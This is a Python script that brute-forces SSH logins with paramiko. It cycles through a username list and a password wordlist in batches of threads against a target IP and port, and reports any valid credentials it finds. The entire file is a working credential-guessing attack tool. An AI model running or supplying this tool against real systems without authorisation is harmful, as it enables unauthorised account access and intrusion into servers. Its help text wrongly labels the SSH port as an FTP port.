import threading
import argparse
import paramiko
from time import sleep

found = False

def argparser() -> argparse.Namespace:
    parser = argparse.ArgumentParser()

    try:
        parser.add_argument("ip", type=str, help="IP to scan")
        parser.add_argument("-usr", "--user_file", type=str, help="Path to the users list")
        parser.add_argument("-pwd", "--passwd_file", type=str, help="Path to the passwd wordlist")
        parser.add_argument("-sp", "--service_port", type=int, default=22, help="Port of the FTP server")
    except argparse.ArgumentError as e:
        print(e)

    return parser.parse_args()

def crack(ip: str, user: str, passwd: str, port: int) -> None:
    global found

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=user, password=passwd, banner_timeout=800)
        print(f"\n>>>>>> FOUND VALID CREDENTIALS <<<<<<\n")
        print(f"USER: {user}")
        print(f"PASS: {passwd}")
        print(f"\n#####################################\n")
        found = True
    except paramiko.AuthenticationException as e:
        print(e)
    finally:
        client.close()

def get_ssh_credentials(ip: str, user_list: str, passwd_list: str, port: int) -> None:
    global found
    threads = []

    with open(user_list) as user_file, open(passwd_list) as passwd_file:
        users = [user.rstrip("\n") for user in user_file.readlines()]
        passwds = [passwd.rstrip("\n") for passwd in passwd_file.readlines()]
    
    for user in users:
        for i, passwd in enumerate(passwds, 1):
            print(f">> trying USER {user} PASS {passwd}")
            t = threading.Thread(target=crack, kwargs={"ip": ip, "user": user, "passwd": passwd, "port": port})
            threads.append(t)
            t.start()

            sleep(0.1)

            if len(threads) == 9 or i == len(threads):
                for t in threads:
                    t.join()
                del threads[:]
            
            if found:
                break
        else:
            continue
        break

def main() -> None:
    args = argparser()
    print(">> checking credentials...")
    get_ssh_credentials(args.ip, args.user_file, args.passwd_file, args.service_port)

if __name__ == "__main__":
    main()